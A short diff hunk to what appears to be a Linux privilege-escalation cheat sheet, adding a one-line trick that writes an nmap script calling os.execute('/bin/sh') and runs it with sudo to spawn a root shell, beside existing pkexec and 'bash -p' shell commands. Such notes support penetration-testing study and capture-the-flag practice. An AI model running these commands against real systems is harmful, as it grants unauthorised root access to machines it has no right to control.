@@ -136,6 +136,7 @@ set PATH variable to current directory and run suid binary
 
 ### Misc SUID binaries 
     pkexec --user root /bin/sh  
+    echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse  
     use binary to exec /bin/bash -p 
 ## Services Running as Root / Services Only Running Locally
     ps -aux | grep root 
